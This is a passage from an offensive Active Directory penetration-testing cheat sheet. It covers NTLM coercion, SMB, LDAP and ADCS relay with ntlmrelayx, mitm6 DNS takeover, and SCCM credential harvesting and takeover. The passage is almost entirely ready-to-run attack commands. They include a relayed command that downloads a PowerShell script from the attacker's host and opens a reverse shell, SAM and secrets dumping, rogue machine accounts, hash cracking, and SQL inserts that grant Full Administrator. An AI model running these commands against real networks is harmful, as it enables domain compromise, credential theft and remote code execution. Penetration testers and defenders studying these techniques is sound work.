python3 printerbug.py [domain]/'[user]$':'[password]'@[victim-ip] SUPPORTPC@80/print
# SpoolSample (C#) — PrinterBug from Windows
SpoolSample.exe [victim-ip] [attacker-ip]
# MS-EFSR PetitPotam (positional: listener target). -no-pass to proxy through ntlmrelayx
python3 PetitPotam.py [attacker-ip] [victim-ip] -u '[user]$' -p '[password]' -d [domain]
# HTTP/WebDAV variant
python3 PetitPotam.py [attacker-host]@80/files [victim-ip] -u '[user]$' -p '[password]'
# MS-DFSNM DFSCoerce (NetrDfsAddStdRoot / NetrDfsRemoveStdRoot) — SMB only
python3 dfscoerce.py -u '[user]$' -p '[password]' [attacker-ip] [victim-ip]
# Coercer — automates 17 methods over 5 RPC protocols (MS-RPRN/EFSR/DFSNM/FSRVP/EVEN)
Coercer scan -t [victim-ip] -u '[user]$' -p '[password]' -d [domain] -v
Coercer coerce -t [victim-ip] -l [attacker-ip] -u '[user]$' -p '[password]' -d [domain] --always-continue
# HTTP/WebDAV coercion needs Coercer 1.6 (-wh WebDAV host, -wp port)
python3 Coercer.py -t [victim-ip] -u '[user]$' -p '[password]' -wh SUPPORTPC -wp 80

9.15.3 SMB Relay

Set SMB = Off in Responder.conf first so ntlmrelayx can bind the SMB server. If the relayed user is local admin, ntlmrelayx auto-dumps the SAM.

# Find non-signing hosts → relay list
nxc smb [victim-ip]/24 --gen-relay-list relayTargets.txt
crackmapexec smb [victim-ip]/24 --gen-relay-list relayTargets.txt
python3 RunFinger.py -i [victim-ip]/24
nmap -Pn --script=smb2-security-mode.nse -p 445 [victim-ip]/24 --open
# Relay over SMB; default action dumps SAM on hosts where the user is admin
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support
# Command execution instead of SAM dump (runs as the relayed session, often SYSTEM)
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://[attacker-ip]:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [attacker-ip] -Port [port]"
# Relay every connection over all supported protocols and pivot via SOCKS
# relayTargets.txt entries: all://[victim-ip]
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

9.15.4 LDAP/LDAPS Relay

SMB→LDAP fails when the client requests signing — relay HTTP NTLM auth (no signing) over LDAP instead, or chain CVE-2019-1040 with --remove-mic. Adding a computer needs LDAPS; ntlmrelayx auto-switches to LDAPS via StartTLS.

# Dump domain info over LDAP
sudo ntlmrelayx.py -t ldap://[dc-ip] -smb2support --no-da --no-acl --lootdir ldap_dump
# Add a computer account (gives you a controlled principal for RBCD)
sudo ntlmrelayx.py -t ldap://[dc-ip] -smb2support --no-da --no-acl --add-computer 'plaintext$'
# ACL abuse: escalate a controlled account if the relayed user has write rights
sudo ntlmrelayx.py -t ldap://[dc-ip] -smb2support --escalate-user 'plaintext$' --no-dump -debug
# RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity on the victim computer,
# then S4U2Proxy-impersonate any user (relay the victim machine's HTTP auth over LDAPS)
sudo ntlmrelayx.py -t ldaps://[domain]\\'[victim]$'@[dc-ip] --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump
# Impersonate Administrator on the victim and pass-the-ticket
getST.py -spn cifs/[victim].[domain] -impersonate Administrator -dc-ip [dc-ip] "[domain]"/"[user]$":"[password]"
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass [victim].[domain]
# Shadow Credentials: relay an account with write rights over the target, set
# msDS-KeyCredentialLink on --shadow-target → recover a PFX → TGT (needs PKINIT/ADCS)
ntlmrelayx.py -t ldap://[domain]\\'[user]'@[dc-ip] --shadow-credentials --shadow-target [target-user] --no-da --no-dump --no-acl
python3 gettgtpkinit.py -cert-pfx [out].pfx -pfx-pass [pfx-pass] [domain]/[target-user] [target-user].ccache

9.15.5 Relay to ADCS Web Enrollment (ESC8)

  • ESC8 = relaying NTLM auth to the AD CS HTTP web-enrollment endpoint (/certsrv/certfnsh.asp) to enrol a certificate as the coerced account.
  • Preconditions: web enrollment enabled, an enabled template allowing client-auth enrolment (e.g. Machine/User), and the endpoint accepting NTLM (check WWW-Authenticate: NTLM).
  • A machine account's cert → TGT → NT hash → silver ticket (or Certipy auth) yields SYSTEM on that machine.
# Confirm the endpoint accepts NTLM
curl -I http://[dc-ip]/certsrv/
# Relay over HTTP to ADCS; --template DomainController when relaying a DC's auth
sudo ntlmrelayx.py -t http://[dc-ip]/certsrv/certfnsh.asp -smb2support --adcs --template Machine
# then coerce the victim, e.g.:
python3 printerbug.py [domain]/'[user]$':'[password]'@[victim-ip] [attacker-ip]
# Base64 cert from ntlmrelayx → PFX → TGT → NT hash
echo -n "[base64-cert]" | base64 -d > [victim].pfx
python3 gettgtpkinit.py -dc-ip [dc-ip] -cert-pfx [victim].pfx '[domain]/[victim]$' [victim].ccache
KRB5CCNAME=[victim].ccache python3 getnthash.py '[domain]/[victim]$' -key [as-rep-key]
# Certipy one-shot equivalent (run as root)
sudo certipy relay -target "http://[dc-ip]" -template Machine
certipy auth -pfx [victim].pfx -dc-ip [dc-ip]

9.15.6 mitm6 — IPv6 DNS Takeover

Windows prefers IPv6 and auto-requests a DHCPv6 lease; mitm6 replies as the rogue IPv6 DNS server, then spoofs WPAD/internal names to funnel HTTP NTLM auth into ntlmrelayx.

# Become the IPv6 DNS server for the domain
sudo mitm6 -d [domain]
# Pair with ntlmrelayx (HTTP auth → LDAPS): drop a computer + delegate access
sudo ntlmrelayx.py -6 -t ldaps://[dc-ip] -wh fakewpad.[domain] -smb2support --delegate-access --add-computer
Relay target Outcome ntlmrelayx flags
smb://[victim-ip] SAM dump (admin) / command exec -tf targets.txt -smb2support [-c "cmd"]
all://[victim-ip] Relay every protocol, pivot via SOCKS -tf targets.txt -smb2support -socks
ldap://[dc-ip] Domain dump --no-da --no-acl --lootdir ldap_dump
ldap://[dc-ip] Add computer account --add-computer 'plaintext$'
ldap://[dc-ip] Privilege escalation via ACL abuse --escalate-user 'plaintext$'
ldaps://[victim]$@[dc-ip] RBCD → impersonate any user on victim --delegate-access --escalate-user 'plaintext$'
ldap://[user]@[dc-ip] Shadow Credentials → TGT for target --shadow-credentials --shadow-target [user]
http://[dc-ip]/certsrv/certfnsh.asp ESC8 cert → TGT → NT hash --adcs --template Machine
ldaps://[dc-ip] (via mitm6) IPv6/WPAD-fed delegate + add computer -6 -wh fakewpad.[domain] --delegate-access --add-computer

9.16 SCCM & Exchange Attacks

9.16.1 SCCM Enumeration

SCCM installs an AD schema extension (CN=System Management,CN=System container) and publishes site/management-point objects, so the site server and MP can be located over LDAP with any domain user. 
# LDAP discovery — System Management container DACL, published MPs, SCCM/MECM strings
python3 sccmhunter.py find -u [user] -p [password] -d [domain] -dc-ip [dc-ip]
python3 sccmhunter.py show -all

# Profile discovered servers over SMB/HTTP(S)/MSSQL — roles, SMB signing, site code
python3 sccmhunter.py smb -u [user] -p [password] -d [domain] -dc-ip [dc-ip] -save

netexec smb [site-server] -u [user] -p [password] -M sccm

# LDAP/SPN role enumeration via objectClass
ldapsearch -x -H ldap://[dc-ip] -b "CN=System Management,CN=System,DC=[domain]" "(|(objectClass=mSSMSManagementPoint)(objectClass=mSSMSSite))"
setspn -T [domain] -Q MSSQLSvc/*

9.16.2 SCCM Credential Harvesting (NAA)

Network Access Accounts (NAAs) are domain accounts pushed to clients in the SCCM policy and stored DPAPI-encrypted; they are recoverable from a compromised client, or by registering a rogue device and requesting the policy. NAAs are sometimes over-privileged.
  • NAA/Task-Sequence/Collection secrets live in the policy and on disk (OBJECTS.DATA) / WMI (CCM_NetworkAccessAccount).
  • Deleting an NAA in the console does NOT remove the encrypted blob from the client.
  • DPAPI decryption needs local admin on the client; rogue-device policy request needs only a machine account.
# Decrypt SCCM secrets from a client (local admin) — WMI, disk (OBJECTS.DATA), or both
python3 sccmhunter.py dpapi -u [user] -p [password] -d [domain] -dc-ip [dc-ip] -target [target-ip] -wmi

# Create a rogue computer account if MachineAccountQuota permits
impacket-addcomputer -computer-name 'PWNED$' -computer-pass 'ComputerPass123' -dc-ip [dc-ip] '[domain]/[user]:[password]'

# Spoof client enrollment and pull/deobfuscate the NAA policy from the MP
python3 sccmhunter.py http -u [user] -p [password] -dc-ip [dc-ip] -cn 'PWNED$' -cp 'ComputerPass123' -debug
# -auto creates the machine and retrieves policies automatically

# SharpSCCM equivalents (Windows, from an enrolled host)
.\SharpSCCM.exe get naa -sms [mp]
.\SharpSCCM.exe local secrets -m disk

# sccmwtf / sccmdecryptpoc — register fake client, request + decrypt NAA policy
python3 sccmwtf.py [mp] [domain] PWNED 'ComputerPass123'
python3 policysecretunobfuscate.py policy.txt

9.16.3 SCCM PXE Credential Recovery

A PXE-enabled Distribution Point hands out task-sequence media containing domain-join (NAA) credentials; the media is AES-encrypted with a (crackable) password. 
# Coerce PXE boot media from a specific DP, extract .var file, then crack + decrypt
python .\pxethief.py 2 [site-server]
tftp -i [site-server] GET "\SMSTemp\...boot.var" boot.var
python .\pxethief.py 5 .\boot.var      # print $sccm$ hash

hashcat -m 19850 hash.txt /usr/share/wordlists/rockyou.txt --force

# Decrypt media with cracked password -> NAA + task-sequence creds
python .\pxethief.py 3 .\boot.var "[password]"

9.16.4 SCCM Client Push Relay

Client Push (default install method) makes the site server authenticate to targets with its push accounts and, failing those, its machine account. A forged DDR/Heartbeat record marks a host as missing the client, coercing that authentication for capture or relay. Requires NTLM enabled, HTTP (not HTTPS), and no PKI client auth. 
# From an enrolled Windows host: capture/relay incoming push auth
.\Inveigh.exe
.\SharpSCCM.exe invoke client-push -t [attacker-ip]

# Linux: catch / crack the relayed machine-account or push-account NTLMv2
sudo responder -I tun0 -v
hashcat -m 5600 sccm_push.txt /usr/share/wordlists/rockyou.txt --force

9.16.5 SCCM Takeover — Relay to Site Database

When the site MSSQL DB is on a separate server, the Primary Server machine account is local admin / sysadmin there. Coerce the site server and relay its auth to the DB's MSSQL service, then grant yourself Full Administrator by writing to the RBAC tables. 
# Relay coerced site-server auth to the site DB MSSQL service (SOCKS)
sudo impacket-ntlmrelayx -t "mssql://[site-server-db]" -smb2support -socks

# Coerce the Primary Server (PetitPotam / Coercer / SpoolSample / DDR enrollment)
python3 PetitPotam.py -u [user] -p [password] -d [domain] [attacker-ip] [site-server]

# Use the SOCKS session to reach the DB as the relayed site-server machine account
proxychains -q impacket-mssqlclient '[domain]/[site-server]$'@[site-server-db] -windows-auth -no-pass

-- In CM_[sitecode]: add controlled user as Full Administrator
-- AdminSID = binary form of the target user's SID
INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite)
VALUES (0x0105...,'[domain]\[user]',0,0,'','','','','[sitecode]');
-- Grant Full Administrator (SMS0001R) over All Objects/Systems/Users
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ([adminid],'SMS0001R','SMS00ALL',29);
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ([adminid],'SMS0001R','SMS00001',1);
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ([adminid],'SMS0001R','SMS00004',1);

# Verify the new admin via the SMS Provider (not the Primary Server)
python3 sccmhunter.py admin -u [user] -p [password] -ip [sms-provider]
# >> show_admins

9.16.6 SCCM Takeover — Relay to AdminService

If the SMS Provider is on a separate server, the Primary Server account is in SMS Admins; relay it to the AdminService REST API (rarely signs NTLM) to add an admin via the SMS_Admin WMI class. 
# Use the SCCM-aware ntlmrelayx fork
git clone -b feature/relay-sccm-adminservice --single-branch https://github.com/garrettfoster13/impacket.git relay-sccm

sudo python3 ntlmrelayx.py -t https://[sms-provider]/AdminService/wmi/SMS_Admin -smb2support \
  --adminservice --logonname "[domain]\[user]" --displayname "[domain]\[user]" --objectsid [target-sid]
# coerce the Primary Server -> expect "Server returned code 201, attack successful"

# Passive site server -> relay to active server SMB (machine account is local admin there)
sudo impacket-ntlmrelayx -t [active-site-server] -smb2support -socks
proxychains -q impacket-secretsdump '[domain]/[passive-server]$'@[active-site-server] -no-pass

9.16.7 SCCM Post-Exploitation (CMPivot / Deployment)

With Full Administrator, abuse the SMS Provider AdminService to query clients (CMPivot) and to deploy applications or scripts as SYSTEM for code execution. 
# CMPivot enumeration of a client (administrators, files, sessions)
python3 sccmhunter.py admin -u [user] -p [password] -ip [sms-provider]
# >> get_device [host]      (grab ResourceId)
# >> interact [resourceid]
# >> administrators

# Application deployment as SYSTEM — UNC payload (also coerces NTLM for relay)
.\SharpSCCM.exe new application -s -n HTB_app -p \\[attacker-ip]\share\test.exe -sms [mp]
.\SharpSCCM.exe new collection -n "evil_col" -t device -sms [mp]
.\SharpSCCM.exe new collection-member -d [host] -n "evil_col" -t device -sms [mp]
.\SharpSCCM.exe new deployment -a HTB_app -c "evil_col" -sms [mp]
.\SharpSCCM.exe invoke update -n "evil_col" -sms [mp]

# PowerShell script deployment via CMPivot (needs a second admin to approve, or self-approve)
echo 'whoami;hostname' > cmd.txt
# in sccmhunter admin shell:
#   interact [resourceid]
#   script /path/to/cmd.txt
